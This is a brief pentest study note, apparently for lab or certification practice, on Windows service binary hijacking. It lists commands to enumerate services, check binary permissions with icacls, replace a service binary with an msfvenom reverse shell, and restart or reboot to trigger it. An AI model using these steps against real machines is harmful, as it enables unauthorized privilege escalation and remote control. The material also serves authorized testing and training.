# Service Binary Hijacking



To get a list of installed windows services:

* `services.msc`(GUI)
* `Get-Service` or `Get-CimInstance`
* `Winpeas or SharpUp (Automated)`

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check for paths here and any unusual paths should be given extra attention.



Using icacls:

```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

This will give us the permission we have over the service binary.

Replace the binary with msfvenom reverse shell.

Try to restart the service:

```powershell
net stop mysql
net start mysql
```

or

```powershell
sc.exe stop auditTracker
sc.exe start auditTracker
```



## Shutdown Privileges

We could reboot the machine if automatic startup:

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

Check if the auto start is enabled

Check if we have SeShutdown Privileges using `whoami /priv`

```
SeShutDownPrivilege
```

Now to reboot:

```powershell
shutdown /r /t 0
```

